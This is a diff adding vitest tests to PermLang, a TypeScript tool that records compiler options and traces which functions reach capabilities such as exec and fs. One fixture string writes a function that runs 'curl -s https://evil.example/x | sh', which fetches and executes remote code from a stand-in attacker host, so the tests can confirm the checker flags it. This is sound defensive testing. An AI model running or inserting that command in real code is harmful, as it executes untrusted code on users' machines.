@@ -6,6 +6,7 @@ import { execFileSync } from "node:child_process";
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import path from "node:path";
+import { fileURLToPath } from "node:url";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { runCli, runCliStreams } from "./run-cli.js";
 
@@ -97,7 +98,7 @@ describe("what gets checked is recorded in the lock (G2, G5)", () => {
     write("config/base.json", JSON.stringify({ include: ["../src"] }));
     write("tsconfig.json", JSON.stringify({ extends: "./config/base.json" }));
     expect(permlang("init").code).toBe(0);
-    expect(lockJson().functions["tsconfig.json#<tsconfig.json>"]).toEqual(["tsconfig.include(src)"]);
+    expect(lockJson().functions["tsconfig.json#<tsconfig.json>"]!.filter((c) => /^tsconfig\.(include|exclude|files)\(/.test(c))).toEqual(["tsconfig.include(src)"]);
     write("config/base.json", JSON.stringify({ include: ["../src"], exclude: ["../src/app.ts"] }));
     expect(permlang("check").out).toContain("tsconfig.json now has exclude src/app.ts");
   });
@@ -539,5 +540,94 @@ describe("code the checked paths import, from outside them", () => {
     const check = permlang("check", "src", "--strictness", "sketch");
     expect(check.code).toBe(1);
     expect(check.out).toContain("permlang.lock.json records lib/pure.ts (imported by the checked files), which the check no longer reads.");
+  });
+});
+
+describe("the compiler options that decide what an import is", () => {
+  // This temporary repository has no node_modules: @types/node comes from PermLang's own.
+  const typeRoots = [fileURLToPath(new URL("../node_modules/@types", import.meta.url))];
+  const tsconfig = (compilerOptions: Record<string, unknown>, selection: Record<string, unknown> = { include: ["src"] }) =>
+    write("tsconfig.json", JSON.stringify({ ...selection, compilerOptions: { strict: true, types: ["node"], typeRoots, ...compilerOptions } }));
+  const defaultImport = 'import cp from "node:child_process";\n/** @perm net(api.example.com) */\nexport function work() {\n  return cp.execSync("curl -s https://evil.example/x | sh").toString();\n}\n';
+
+  it("records each as TypeScript works it out, so turning off default imports shows, and the access is still found", () => {
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler" });
+    expect(permlang("init").code).toBe(0);
+    const recorded = lockJson().functions["tsconfig.json#<tsconfig.json>"]!;
+    expect(recorded).toEqual(expect.arrayContaining(["tsconfig.allowSyntheticDefaultImports(true)", "tsconfig.esModuleInterop(false)", "tsconfig.module(ESNext)", "tsconfig.moduleResolution(Bundler)"]));
+    commit("base");
+
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler", allowSyntheticDefaultImports: false });
+    write("src/worker.ts", defaultImport);
+    const check = permlang("check");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("tsconfig.json now has allowSyntheticDefaultImports false, but permlang.lock.json records allowSyntheticDefaultImports true.");
+    expect(check.out).toContain("work can now reach exec");
+    const md = permlang("diff", "HEAD", "--format", "markdown").out;
+    expect(md).toContain("allowSyntheticDefaultImports: now <code>false</code>, was <code>true</code>");
+    expect(md).toContain("<code>+ exec</code>");
+  });
+
+  it("finds what a default import of a capability module calls, when TypeScript gives it no type (module commonjs, no esModuleInterop)", () => {
+    tsconfig({ module: "commonjs" }, { files: ["src/index.ts"] });
+    write("src/index.ts", 'import { work } from "./worker";\nexport function main() {\n  return work();\n}\n');
+    write("src/worker.ts", "export function work() {\n  return 1;\n}\n");
+    expect(permlang("init").code).toBe(0);
+    expect(lockJson().functions["tsconfig.json#<tsconfig.json>"]).toEqual(expect.arrayContaining(["tsconfig.allowSyntheticDefaultImports(false)", "tsconfig.module(CommonJS)", "tsconfig.moduleResolution(Node10)"]));
+    expect(lockJson().functions["permlang.config.json#<permlang.config.json>"]).toContain("permlang.imported(src/worker.ts)");
+    write("src/worker.ts", defaultImport);
+    const check = permlang("check");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("work can now reach exec");
+    expect(check.out).toContain("main can now reach exec");
+  });
+
+  it("follows imports even when tsconfig.json turns resolving them off, as what runs doesn't change", () => {
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler" }, { files: ["src/index.ts"] });
+    write("src/index.ts", 'import { work } from "./worker";\nexport function main() {\n  return work();\n}\n');
+    write("src/worker.ts", "export function work() {\n  return 1;\n}\n");
+    expect(permlang("init").code).toBe(0);
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler", noResolve: true }, { files: ["src/index.ts"] });
+    write("src/worker.ts", 'import { execSync } from "node:child_process";\nexport function work() {\n  return execSync("id").toString();\n}\n');
+    const check = permlang("check");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("work can now reach exec");
+    expect(check.out).not.toContain("PERM007");
+  });
+
+  it("records options that change what a name or an import resolves to only when they're set", () => {
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler" });
+    expect(permlang("init").code).toBe(0);
+    const before = lockJson().functions["tsconfig.json#<tsconfig.json>"]!;
+    expect(before.some((c) => /^tsconfig\.(preserveSymlinks|jsx|importHelpers|allowArbitraryExtensions|libReplacement)\(/.test(c))).toBe(false);
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler", preserveSymlinks: true, jsx: "react-jsx", jsxImportSource: "preact", allowArbitraryExtensions: true });
+    const check = permlang("check");
+    expect(check.code).toBe(1);
+    for (const phrase of ["preserveSymlinks true", "jsx react-jsx", "jsxImportSource preact", "allowArbitraryExtensions true"]) {
+      expect(check.out).toContain(`tsconfig.json now has ${phrase}, which permlang.lock.json doesn't record.`);
+    }
+  });
+});
+
+describe("a default import TypeScript gives no type (module commonjs, no esModuleInterop)", () => {
+  const typeRoots = [fileURLToPath(new URL("../node_modules/@types", import.meta.url))];
+  const files: Record<string, string> = {
+    "src/member.ts": 'import fs from "node:fs";\nexport function member() {\n  return fs.readFileSync("config.json", "utf8");\n}\n',
+    "src/destructured.ts": 'import cp from "node:child_process";\nexport function destructured() {\n  const { execSync } = cp;\n  return execSync("id");\n}\n',
+    "src/reexported.ts": 'import cp from "node:child_process";\nexport { cp };\n',
+    "src/constant.ts": 'import fs from "node:fs";\nexport function constant() {\n  return fs.constants.F_OK;\n}\n',
+    "src/pure.ts": 'import path from "node:path";\nimport os from "node:os";\nexport function pure() {\n  return path.join(os.tmpdir(), "x");\n}\n',
+    "src/typed.ts": 'import cp from "node:child_process";\nexport type Runner = typeof cp;\n',
+  };
+
+  it("checks each use against the module, and loses track of nothing", () => {
+    write("tsconfig.json", JSON.stringify({ compilerOptions: { module: "commonjs", strict: true, types: ["node"], typeRoots }, include: ["src"] }));
+    for (const [file, code] of Object.entries(files)) write(file, code);
+    const report = JSON.parse(permlang("check", "--no-lock", "--json", "--strictness", "sketch").out) as { functions: { file: string; name: string; actual: string[] }[] };
+    const reaches = (file: string) => Object.fromEntries(report.functions.filter((f) => f.file === file).map((f) => [f.name, f.actual]));
+    expect(reaches("src/member.ts")).toEqual({ member: ["fs.read(config.json)"] });
+    expect(reaches("src/destructured.ts")).toEqual({ destructured: ["unverifiable"] });
+    expect(reaches("src/reexported.ts")).toEqual({ "<module>": ["unverifiable"] });
+    for (const harmless of ["src/constant.ts", "src/pure.ts", "src/typed.ts"]) expect(reaches(harmless)).toEqual({});
   });
 });
